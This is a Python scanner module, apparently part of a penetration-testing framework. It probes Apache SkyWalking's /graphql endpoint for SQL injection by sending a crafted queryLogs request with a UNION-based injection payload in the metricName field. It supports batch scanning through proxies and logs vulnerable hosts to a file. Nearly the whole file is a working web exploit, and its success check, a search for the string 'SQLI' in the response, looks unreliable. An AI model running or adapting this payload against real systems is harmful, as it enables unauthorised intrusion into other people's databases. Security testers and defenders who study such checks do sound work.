#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
import json
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()


class SkywalkingSqlScan:

    def run(self, urls):
        try:
            url = urls + '/graphql'
            payload = {
                "query": "query queryLogs($condition: LogQueryCondition){queryLogs(condition: $condition){total,logs{serviceId,serviceName,isError,content}}}",
                "variables": {"condition": {
                    "metricName": "INFORMATION_SCHEMA.USERS union all select h2version())a where 1=? or 1=? or 1=? --",
                    "endpointId": "1", "traceId": "1", "state": "ALL", "stateCode": "1", "paging": {"pageSize": 10}}}}
            data = json.dumps(payload)
            header = {
                "User-Agent":self.headers,
                "Content-Type": "application/json",
                "Accept-Encoding": "gzip, deflate",
            }
            response = requests.post(url,headers=header,data=data, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "SQLI" in response.text:
                OutPrintInfoSuc("Skywalking", f'存在SQL注入 {url}')
                if not self.batch:
                    OutPrintInfo("Skywalking", '[b bright_red]详情参考https://mp.weixin.qq.com/s/Sw2Zdz2-wImYHMgUXXtrtQ ')

                else:
                    OutPutFile("apache_skywalking_sql.txt",f'存在SQL注入 {url}')

            else:
                if not self.batch:
                    OutPrintInfo("Skywalking", '不存在存在SQL注入')

        except Exception:
            if not self.batch:
                OutPrintInfo("Skywalking", "目标请求出错")

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        if not self.batch:
            req = ReqSet(proxy=proxy)
            self.proxy = req["proxy"]
        else:
            self.proxy = {"http": proxy, "https": proxy}

        if not self.batch:
            OutPrintInfo("Skywalking", '开始检测SQL注入...')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Skywalking", 'SQL注入检测结束')